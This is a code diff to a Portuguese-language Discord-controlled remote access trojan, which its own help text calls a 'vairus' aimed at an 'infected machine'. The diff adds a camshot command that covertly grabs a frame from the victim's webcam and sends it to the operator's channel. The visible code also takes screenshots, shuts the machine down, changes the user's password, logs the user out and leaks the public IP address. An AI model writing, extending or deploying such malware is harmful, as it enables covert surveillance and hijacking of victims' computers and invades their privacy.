@@ -5,6 +5,7 @@ import os
 import getpass
 from PIL import ImageGrab
 import ctypes
+import cv2
 from string import ascii_lowercase, digits
 from random import choices
 
@@ -42,7 +43,8 @@ async def help(ctx):
     embed = discord.Embed(
         title="COMANDOS DO VAIRUS",
         description=
-        """***>spyshot -> Faz uma captura de tela da maquina infectada;***
+        """***>screenshot -> Faz uma captura de tela da maquina infectada;***
+        ***>camshot -> Faz uma captura da webcam da maquina infectada;***
         ***>shutdown -> Desliga instantaneamente a maquina infectada;***
         ***>cgpass <password> -> Muda a senha do usuário (Não coloque caracteres especiais ou espaços);***
         ***>unuser -> Desconecta o usuário;***
@@ -55,7 +57,7 @@ async def help(ctx):
     await ctx.send(embed=embed)
 
 @bot.command()
-async def spyshot(ctx):
+async def screenshot(ctx):
     if ctx.channel.id != channel.id:
         return
     try:
@@ -67,6 +69,30 @@ async def spyshot(ctx):
 
     except Exception as e:
         await ctx.send(f"Erro no screenshot: {e}")
+
+@bot.command()
+async def camshot(ctx):
+    if ctx.channel.id != channel.id:
+        return
+    
+    try:
+        cam = cv2.VideoCapture(0)
+        
+        if not cam.isOpened():
+            await ctx.send("**❌ A webcam não pôde ser acessada.**")
+            return
+
+        ret, frame = cam.read()
+        cam.release()
+        
+        if ret:
+            temp_path = os.path.join(os.getenv("TEMP"), "cam.png")
+            cv2.imwrite(temp_path, frame)
+            await ctx.send(file=discord.File(temp_path))
+
+    except Exception as e:
+        await ctx.send(str(e))
+        cam.release()
 
 @bot.command()
 async def shutdown(ctx):
@@ -114,5 +140,6 @@ async def getinfo(ctx):
     public_ip = response.text
     await ctx.send(f"***PUBLIC IP ADRESS***: ||``{public_ip}``||")
     os.system(f'del "{path}"')
+
 
 bot.run(token=TOKEN) # PROGRAMADO POR NOKEIC, NEGATIVE ZERO (POR FAVOR NÃO REMOVA OS CREDITOS 😓😭)
